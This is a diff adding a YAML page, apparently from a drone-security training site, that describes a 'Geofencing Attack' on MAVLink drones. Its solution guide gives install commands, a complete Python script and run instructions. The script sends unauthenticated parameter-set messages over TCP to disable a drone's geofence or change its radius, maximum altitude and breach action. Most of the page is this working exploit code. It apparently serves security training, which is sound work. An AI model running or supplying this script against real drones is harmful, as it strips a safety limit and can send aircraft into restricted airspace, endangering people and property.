@@ -1,0 +1,131 @@
+title: Geofencing Attack
+order: 2
+description: Manipulating MAVLink messages to alter the geofencing parameters of a drone, allowing it to enter restricted areas or exceed altitude limits.
+breadcrumb:
+  - text: Attack Scenarios
+    link: /attacks
+  - text: Denial-of-Service
+  - text: Geofencing Attack
+
+sections:
+  - title: Description
+    content: |
+      A geofencing attack involves sending malicious MAVLink messages to change the geofencing settings of a drone. 
+      This can be used to disable the geofence, change its boundaries, or alter its behavior upon breach, allowing the drone to enter restricted or dangerous areas.
+
+  - title: Resources
+    content:
+      - text: MAVLink Protocol
+        link: https://mavlink.io/en/
+      - text: Ardupilot GeoFencing
+        link: https://ardupilot.org/plane/docs/common-geofencing-landing-page.html#common-geofencing-landing-page
+
+  - title: Solution Guide
+    collapsible: true
+    steps:
+      - title: Step 1. Setup
+        description: |
+          Ensure you have Python and the necessary libraries installed:
+          ```sudo apt-get update
+          sudo apt-get install python3 python3-pip
+          pip3 install pymavlink scapy
+          ```
+
+      - title: Step 2. Create the Script
+        description: |
+          Create a Python script named `geo-fencing.py` and paste the following code:
+          ```from pymavlink import mavutil
+          from scapy.all import *
+          import sys
+
+          def set_param(mav, param_id, param_value, param_type):
+              """
+              Create a MAVLink parameter set message.
+              """
+              param_set_msg = mav.param_set_encode(
+                  target_system=mav.target_system,
+                  target_component=mav.target_component,
+                  param_id=param_id.encode('utf-8'),  # Ensure param_id is a properly encoded string
+                  param_value=param_value,
+                  param_type=param_type
+              )
+              return param_set_msg.pack(mav)
+
+          def send_mavlink_packet_tcp(packet_data, target_ip, target_port):
+              """
+              Send a MAVLink packet using TCP.
+              """
+              sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+              sock.connect((target_ip, target_port))
+              sock.send(packet_data)
+              sock.close()
+
+          if __name__ == "__main__":
+              if len(sys.argv) != 3:
+                  print("Usage: python geo-fencing.py <target_ip:target_port> <action>")
+                  print("Actions: disable, enable, set_radius:<value>, set_alt_max:<value>, set_action:<value>")
+                  sys.exit(1)
+
+              target = sys.argv[1]
+              action = sys.argv[2]
+              target_ip, target_port = target.split(':')
+              target_port = int(target_port)
+
+              mav = mavutil.mavlink.MAVLink(None)
+              mav.target_system = 1
+              mav.target_component = 1
+
+              if action == "disable":
+                  # Disable geofence
+                  param_packet = set_param(mav, 'FENCE_ENABLE', 0, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
+                  send_mavlink_packet_tcp(param_packet, target_ip, target_port)
+                  print("Geofence disabled")
+              elif action == "enable":
+                  # Enable geofence
+                  param_packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
+                  send_mavlink_packet_tcp(param_packet, target_ip, target_port)
+                  print("Geofence enabled")
+              elif action.startswith("set_radius:"):
+                  # Enable geofence and set radius
+                  value = float(action.split(":")[1])
+                  param_packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
+                  send_mavlink_packet_tcp(param_packet, target_ip, target_port)
+                  param_packet = set_param(mav, 'FENCE_RADIUS', value, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
+                  send_mavlink_packet_tcp(param_packet, target_ip, target_port)
+                  print(f"Geofence radius set to {value} meters")
+              elif action.startswith("set_alt_max:"):
+                  # Enable geofence and set maximum altitude
+                  value = float(action.split(":")[1])
+                  param_packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
+                  send_mavlink_packet_tcp(param_packet, target_ip, target_port)
+                  param_packet = set_param(mav, 'FENCE_ALT_MAX', value, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
+                  send_mavlink_packet_tcp(param_packet, target_ip, target_port)
+                  print(f"Geofence maximum altitude set to {value} meters")
+              elif action.startswith("set_action:"):
+                  # Enable geofence and set action
+                  value = int(action.split(":")[1])
+                  param_packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
+                  send_mavlink_packet_tcp(param_packet, target_ip, target_port)
+                  param_packet = set_param(mav, 'FENCE_ACTION', value, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
+                  send_mavlink_packet_tcp(param_packet, target_ip, target_port)
+                  print(f"Geofence breach action set to {value}")
+              else:
+                  print("Invalid action. Actions: disable, enable, set_radius:<value>, set_alt_max:<value>, set_action:<value>")
+                  sys.exit(1)
+          ```
+
+      - title: Step 3. Run the Script
+        description: |
+          Execute the script with sudo and the target IP and port:
+          ```sudo python geo-fencing.py <ip:port> <action>
+          ```
+          Replace `<ip:port>` with the actual IP address and port of the drone, and `<action>` with one of the following:
+          - `disable`
+          - `enable`
+          - `set_radius:<value>`
+          - `set_alt_max:<value>`
+          - `set_action:<value>`
+
+      - title: Step 4. Monitor the Effects
+        description: |
+          Observe the drone's behavior to see the effects of the geofence parameter changes. Ensure that the changes have been applied as expected by verifying the drone's response to the new geofencing settings.
